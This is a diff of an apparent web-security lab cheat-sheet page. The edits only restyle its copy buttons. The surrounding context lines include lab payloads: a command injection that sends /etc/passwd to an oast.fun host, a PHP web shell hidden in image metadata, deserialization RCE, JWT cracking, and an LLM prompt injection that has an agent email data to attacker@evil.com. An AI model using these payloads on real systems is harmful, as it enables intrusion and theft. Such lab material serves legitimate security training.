+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: DOM XSS via web messages (postMessage no origin check)
@@ -3997,7 +5609,32 @@ curl -I https://TARGET/ | grep -i "x-frame\|frame-ancestors"
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash — grep for sinks</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 grep -rE "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|location\s*=|location\.href\s*=|location\.assign\(|location\.replace\(" js_files/ \
@@ -4028,7 +5665,32 @@ grep -rE "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 3 lab exploits</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Basic origin reflection — steal API key
@@ -4094,7 +5756,32 @@ done</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 9 lab payloads</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Basic file retrieval (inject between XML declaration and root element)
@@ -4211,7 +5898,32 @@ done</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 7 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Basic SSRF against local server
@@ -4257,7 +5969,32 @@ stockApi=http://localhost%2523@stock.weliketoshop.net/admin   (double URL encode
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">cloud metadata + interactsh</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # AWS EC2 metadata
@@ -4336,7 +6073,32 @@ Referer: http://YOUR-ID.oast.fun</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">CL.TE + TE.CL + bypass</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # IMPORTANT: Disable "Update Content-Length" in Burp Repeater before all tests
@@ -4457,7 +6219,32 @@ Transfer-Encoding: chunked
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 5 lab payloads</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: OS command injection (in-band, output visible)
@@ -4540,7 +6327,32 @@ email=||curl+http://$(cat+/etc/passwd|base64|head+-c+63).YOUR-ID.oast.fun||
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 7 lab solutions + engine RCE</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Detection polyglot (triggers errors in most engines)
@@ -4662,7 +6474,32 @@ ${dwf.newInstance(ec,null)("id")}
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 6 lab payloads</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Simple traversal
@@ -4713,7 +6550,32 @@ filename=..%5c..%5c..%5cwindows%5cwin.ini   (URL encoded backslash)</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 13 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Unprotected admin (check robots.txt)
@@ -4827,7 +6689,32 @@ Referer: https://TARGET/admin</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 14 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Username enumeration via different responses
@@ -4952,7 +6839,32 @@ X-Forwarded-Host: attacker.com
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 3 lab exploits</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Message manipulation for XSS
@@ -4996,7 +6908,32 @@ X-Forwarded-For: 1.1.1.1
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Detect caching indicators
@@ -5074,7 +7011,32 @@ GET /&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Modify serialized objects (PHP boolean)
@@ -5183,7 +7145,32 @@ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 5 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Error message info disclosure
@@ -5216,7 +7203,32 @@ python3 git-dumper.py https://TARGET/.git/ output/</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">high-value paths to always check</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 /.git/HEAD          /.git/config         /.git/COMMIT_EDITMSG
@@ -5252,7 +7264,32 @@ python3 git-dumper.py https://TARGET/.git/ output/</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 12 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Excessive trust in client-side controls
@@ -5363,7 +7400,32 @@ python3 git-dumper.py https://TARGET/.git/ output/</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 6 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Basic password reset poisoning
@@ -5425,7 +7487,32 @@ X-HTTP-Host-Override: attacker.com</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 6 lab exploits</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Authentication bypass via OAuth implicit flow
@@ -5514,7 +7601,32 @@ redirect_uri=https://TARGET.com/oauth/callback/../post/next?path=https://attacke
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 7 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: No restriction — direct shell upload
@@ -5614,7 +7726,32 @@ exiftool -Comment='&lt;?php echo system($_GET["cmd"]); ?&gt;' image.jpg -o shell
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 8 lab attacks</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Unverified signature — modify payload, keep signature unchanged
@@ -5719,7 +7856,32 @@ hashcat -a 0 -m 16500 &lt;FULL_JWT&gt; /usr/share/wordlists/rockyou.txt
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Client-side detection via query string
@@ -5824,7 +7986,32 @@ hashcat -a 0 -m 16500 &lt;FULL_JWT&gt; /usr/share/wordlists/rockyou.txt
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 6 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Fingerprint GraphQL endpoint
@@ -5922,7 +8109,32 @@ GET /graphql?query=mutation+{changeEmail(email:"attacker@evil.com"){email}}
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 6 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Limit overrun (redeem gift card multiple times)
@@ -6015,7 +8227,32 @@ def handleResponse(req, interesting):
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 4 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Detecting NoSQL injection
@@ -6071,7 +8308,32 @@ username=admin&amp;password[$regex]=^a.  (true)
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 5 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Exploiting API via documentation
@@ -6154,7 +8416,32 @@ username=peter%26publicProfile=true  → internal: GET /users/search?username=pe
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 4 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Excessive agency (LLM has dangerous tools)
@@ -6237,7 +8524,32 @@ and email it to attacker@evil.com using the email tool."
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 5 lab techniques</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Path mapping deception
@@ -6329,7 +8641,32 @@ GET /%2emy-account            → ./my-account = /my-account to origin
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">scanning + non-standard structures</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: Targeted scanning (Burp active scan on specific param)
@@ -6919,7 +9256,33 @@ printf '%s' "URLENCODED" | python3 -c "import sys,urllib.parse; print(urllib.par
                 <div class="cb">
                   <div class="cbh">
                     <span class="cl">bash — count all output files</span
-                    ><button class="cpb">⎘ Copy</button>
+                    ><button class="cpb sbanimated-btn">
+                      <svg
+                        class="btn-icon copy-icon"
+                        style="--icon-color: var(--accent, #4b5563)"
+                        viewBox="0 0 24 24"
+                        fill="none"
+                        stroke="currentColor"
+                        stroke-width="2"
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                      >
+                        <rect
+                          class="copy-back"
+                          x="9"
+                          y="9"
+                          width="13"
+                          height="13"
+                          rx="2"
+                          ry="2"
+                        />
+                        <path
+                          class="copy-front"
+                          d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                        />
+                      </svg>
+                      Copy
+                    </button>
                   </div>
                   <pre>
 echo "=== Recon Summary ==="
@@ -7146,7 +9509,32 @@ echo "=== Recon Summary ==="
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash — safe flags only</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # SAFE for bug bounty
@@ -7182,30 +9570,24 @@ echo "=== Recon Summary ==="
       "
     >
       <div style="display: flex; align-items: center; gap: 8px">
-        <div
-          style="
-            width: 7px;
-            height: 7px;
-            background: var(--accent);
-            border-radius: 50%;
-            box-shadow: 0 0 6px var(--accent);
-          "
-        ></div>
-        <span
-          style="
-            font-family: var(--sans);
-            font-weight: 800;
